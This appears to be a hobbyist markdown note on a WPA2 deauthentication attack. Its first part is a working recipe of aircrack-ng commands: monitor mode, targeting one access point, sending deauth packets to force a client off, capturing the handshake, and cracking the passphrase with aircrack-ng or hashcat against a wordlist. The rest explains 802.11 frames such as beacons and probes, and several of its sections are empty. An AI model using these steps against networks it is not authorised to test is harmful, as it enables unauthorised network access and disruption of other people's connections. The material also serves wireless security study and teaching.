# WPA2 Deauth Attack

Basic Steps:

* (1) Put wNIC into monitor or promiscious mode
* (2) Monitor the network for traffic
    * (2a) Consider Strength of signal
    * (2b) Consider Whether or not you see both router and device traffic
* (3) Target the monitor to just the interested Access Point and dump its traffic
* (4) In parallel, send a malicious de-auth packet from your wNIC whose dest is the station and whose src is the router
* (5) Hopefully capture the eapol handshake to get the encrypted passphrase
* (6) Use a hash-breaker tool find a passphrase usually from a dictionary or set of rules that reproduce the recovered hased passphrase

These steps can be executed on a linux box with the following

* [install aircrack tools](https://www.aircrack-ng.org/doku.php?id=install_aircrack)
* `sudo airmon-ng start wlp5s0`
    * Assume your NIC is `wlp5s0`, most are named `wlan0`
* `iwconfig to verify monitor mode`
* `sudo airodump-ng wlp5s0mon`
    * This will give you an idea of what AP's, stations, and channels to target
    * Record the MAC of the AP and the station you want to kick off
* `sudo airodump-ng wlp5s0mon -c <chan> --bssid <AP MAC> -w <file_name>`
    * Keep this open to log WPA2 Handshake
* In other term `sudo aireplay wlp5s0mon -0 1 -a <AP MAC> -c <TARGET MAC>`
    * This sends the attack
    * Hopefully in the dump term you capture the handshake
* To crack using aircrack: `aircrack-ng -a 2 -b <bssid> <.cap file> -w <wordlist>`
* To restore if -> `sudo airmon-ng stop wlp5s0mon && sudo ifconfig wlp5s0 up`
* To crack with hashcat Install hashcat and haschcat-utils
    * Convert the `.cap` to a `.hccapx`
    * `hashcat -m 2500 -a 0 <hhcapx> <wordlist>` will do a straight dictionary attack

# Probes, Beacons, and Wifi Packets

To get stated analyzing this attack we need to look at exactly how one knows that an access point or AP is avaiable. After all this attack targets a single and deliberately chosen AP. The best way to start analyzing packets is with wireshark which can be installed with the `apt` mananger. One can run this `sudo airodump-ng wlp5s0mon -c <chan> --bssid <AP MAC> -w <file_name>` followed by running wire shark on the outputted .cap file. In wireshark you can filter out alot of the noise on the channel with the filter `wlan.addr == <bssid> `.

# WIFI packet Basic Structure

```

-----------------------------------------------------------------
| FC | Dur | DA | SA | BSSID | Seq | A4 | QoS | HT | Body | FCS |
-----------------------------------------------------------------

```

* FC = Frame Control. Most importantly defines frame type and sub type. See [here](https://en.wikipedia.org/wiki/802.11_Frame_Types)
* Dur = Duration. Usually denotes the amount requested or granted of airtime
* DA = Destination Address
* SA = Source Address
* BSSID = MAC of AP
* Seq = Sequence Number
* A4 = MAC 4 only present in frames between APs
* QoS = Quality of Service
* HT = High Throughput
* Body = Main body of packet
* FCS = CRC of packet including header

Each of these fields have drastically different meanings based on the type of frame of which there are 4 major types:

* Data
* Control
* Management
* Misc

Below we look at a very very small subset of the packet and their contents as it relates to this attack.

## Beacon

* Sent automatically by all acccess points at a regular interval.
* FC = `0x8000`
    * This decodes to a frame of type Management and a subtype of beacon
* DA = `ff:ff:ff:ff:ff:ff` and SA=BSSID
* In a beacon frame rate of beacon frame sent is advertised
* Capabilites, SSID (the ascii name of the AP), Supported rates are all sent.
* To see this, do a dump with the `-e` flag targeting an AP: `sudo airodump-ng wlp5s0mon -e --bssid B6:FE:F4:C3:ED:EE -c 6 -w out`
* Open wire shark on the .cap file and you should see a butt load of beacons
* When scanning for APs listening for beacons is considered a passive scan

## Probe

* Deliberatley sent by the station (STA) to the AP aka an active AP scan
* FC = `0x4000`
    * This decodes to a managment type with probe request sub type
* DA = `ff:ff:ff:ff:ff:ff` = BSSID
* SA = <sender MAC>
* The packet really only contains the STAs advertised rates and the ssid of a AP if the scan was targeted to an AP
* To capture these packets we just set the ESP32 deluminator to scan our home AP and dumped packets targeting that AP

## Association Request and Response

## Authentication Deauthentication

## WPA2 EAPOL Frames

# Resources

* [Wiki on Wifi Frame](https://en.wikipedia.org/wiki/802.11_Frame_Types)
* [Wiki on 802.11](https://en.wikipedia.org/wiki/IEEE_802.11#Layer_2_%E2%80%93_Datagrams)
